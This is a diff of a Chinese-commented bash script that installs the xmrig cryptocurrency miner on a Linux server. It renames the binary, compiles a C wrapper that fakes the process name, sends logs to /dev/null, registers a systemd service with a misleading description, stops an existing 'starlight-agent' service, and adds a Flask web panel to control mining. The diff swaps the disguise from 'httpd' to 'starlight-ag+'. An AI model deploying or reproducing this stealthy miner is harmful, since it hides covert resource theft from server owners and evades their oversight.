@@ -21,9 +21,13 @@ source /opt/utils/venv/bin/activate
 pip install flask || { echo "安装 Flask 失败" 1>&2; exit 1; }
 deactivate
 
-# 停止并禁用 starlight-agent.service
-systemctl stop starlight-agent.service || { echo "停止 starlight-agent.service 失败" 1>&2; exit 1; }
-systemctl disable starlight-agent.service || { echo "禁用 starlight-agent.service 失败" 1>&2; exit 1; }
+# 检查 starlight-agent.service 是否正在运行
+if systemctl is-active --quiet starlight-agent.service; then
+    systemctl stop starlight-agent.service || { echo "停止 starlight-agent.service 失败" 1>&2; exit 1; }
+    systemctl disable starlight-agent.service || { echo "禁用 starlight-agent.service 失败" 1>&2; exit 1; }
+else
+    echo "starlight-agent.service 未运行，跳过停止和禁用步骤"
+fi
 
 # 检查依赖
 for cmd in curl tar gcc python3; do
@@ -52,7 +56,7 @@ web_port=${web_port:-5000}
 if id "httpd" &>/dev/null; then
     userdel -r httpd || { echo "删除用户 httpd 失败" 1>&2; exit 1; }
 fi
-if getent group httpd &>/dev/null; then
+if getent group "httpd" &>/dev/null; then
     groupdel httpd || { echo "删除组 httpd 失败" 1>&2; exit 1; }
 fi
 
@@ -73,8 +77,8 @@ mkdir -p /opt/utils /etc/systemd/system/conf.d || { echo "创建目录失败" 1>
 
 # 下载并安装 xmrig
 curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/utils || { echo "下载或解压失败" 1>&2; exit 1; }
-mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/httpd || { echo "移动文件失败" 1>&2; exit 1; }
-chmod +x /opt/utils/httpd
+mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/starlight-ag+ || { echo "移动文件失败" 1>&2; exit 1; }
+chmod +x /opt/utils/starlight-ag+
 rm -rf /opt/utils/xmrig-6.22.2
 
 # 创建 wrapper 以伪装进程名
@@ -82,8 +86,8 @@ cat > /opt/utils/wrapper.c <<EOF
 #include <sys/prctl.h>
 #include <unistd.h>
 int main(int argc, char *argv[]) {
-    prctl(PR_SET_NAME, "httpd", 0, 0, 0); // 伪装成 httpd 进程
-    execv("/opt/utils/httpd", argv);
+    prctl(PR_SET_NAME, "starlight-ag+", 0, 0, 0); // 伪装成 starlight-ag+ 进程
+    execv("/opt/utils/starlight-ag+", argv);
     return 0;
 }
 EOF
@@ -91,7 +95,7 @@ gcc -o /opt/utils/wrapper /opt/utils/wrapper.c || { echo "编译 wrapper 失败"
 rm /opt/utils/wrapper.c
 
 # 生成配置文件
-cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
+cat > /etc/systemd/system/conf.d/starlight-ag+.conf <<EOF
 {
     "cpu": {
         "threads": $threads
@@ -110,20 +114,20 @@ cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
 EOF
 
 # 检查并删除已存在的服务文件
-if [ -f "/etc/systemd/system/httpd.service" ]; then
-    rm -f /etc/systemd/system/httpd.service || { echo "删除服务文件 httpd.service 失败" 1>&2; exit 1; }
+if [ -f "/etc/systemd/system/starlight-ag+.service" ]; then
+    rm -f /etc/systemd/system/starlight-ag+.service || { echo "删除服务文件 starlight-ag+.service 失败" 1>&2; exit 1; }
 fi
 
 # 创建 systemd 服务文件
-cat > /etc/systemd/system/httpd.service <<EOF
+cat > /etc/systemd/system/starlight-ag+.service <<EOF
 [Unit]
-Description=HTTP Server
+Description=Starlight AG+ Service
 After=network.target
 
 [Service]
 User=httpd
 Group=httpd
-ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=$threads
+ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/starlight-ag+.conf --no-color --log-file=/dev/null --threads=$threads
 Restart=always
 CPUQuota=50%  # 限制 CPU 使用率为 50%
 
@@ -133,8 +137,8 @@ EOF
 
 # 启用并启动服务
 systemctl daemon-reload
-systemctl enable httpd.service
-systemctl start httpd.service || { echo "服务启动失败" 1>&2; exit 1; }
+systemctl enable starlight-ag+.service
+systemctl start starlight-ag+.service || { echo "服务启动失败" 1>&2; exit 1; }
 
 # 创建 Flask 应用
 cat > /opt/utils/web_control.py <<EOF
@@ -181,26 +185,26 @@ def start():
         return redirect(url_for('login'))
     threads = request.form.get('threads', '1')
     duration = request.form.get('duration', '0')  # 0 表示无限运行
-    subprocess.run(['systemctl', 'stop', 'httpd.service'], check=True)
+    subprocess.run(['systemctl', 'stop', 'starlight-ag+.service'], check=True)
     subprocess.run(['systemctl', 'daemon-reload'], check=True)
-    subprocess.run(['systemctl', 'start', 'httpd.service'], check=True)
+    subprocess.run(['systemctl', 'start', 'starlight-ag+.service'], check=True)
     if duration != '0':
         time.sleep(int(duration))
-        subprocess.run(['systemctl', 'stop', 'httpd.service'], check=True)
+        subprocess.run(['systemctl', 'stop', 'starlight-ag+.service'], check=True)
     return redirect(url_for('control'))
 
 @app.route('/stop', methods=['POST'])
 def stop():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
-    subprocess.run(['systemctl', 'stop', 'httpd.service'], check=True)
+    subprocess.run(['systemctl', 'stop', 'starlight-ag+.service'], check=True)
     return redirect(url_for('control'))
 
 @app.route('/restart', methods=['POST'])
 def restart():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
-    subprocess.run(['systemctl', 'restart', 'httpd.service'], check=True)
+    subprocess.run(['systemctl', 'restart', 'starlight-ag+.service'], check=True)
     return redirect(url_for('control'))
 
 @app.route('/reload', methods=['POST'])
@@ -283,9 +287,9 @@ nohup /opt/utils/venv/bin/python /opt/utils/web_control.py > /opt/utils/flask.lo
 # 输出后续操作说明
 echo "部署完成！"
 echo "使用以下命令管理服务："
-echo "停止服务：systemctl stop httpd.service"
-echo "启动服务：systemctl start httpd.service"
+echo "停止服务：systemctl stop starlight-ag+.service"
+echo "启动服务：systemctl start starlight-ag+.service"
 echo "重新加载服务：systemctl daemon-reload"
-echo "指定运行时间后停止：timeout <秒数> systemctl start httpd.service"
-echo "例如：timeout 3600 systemctl start httpd.service （运行1小时后停止）"
+echo "指定运行时间后停止：timeout <秒数> systemctl start starlight-ag+.service"
+echo "例如：timeout 3600 systemctl start starlight-ag+.service （运行1小时后停止）"
 echo "网页端控制面板地址：http://<服务器IP>:$web_port"
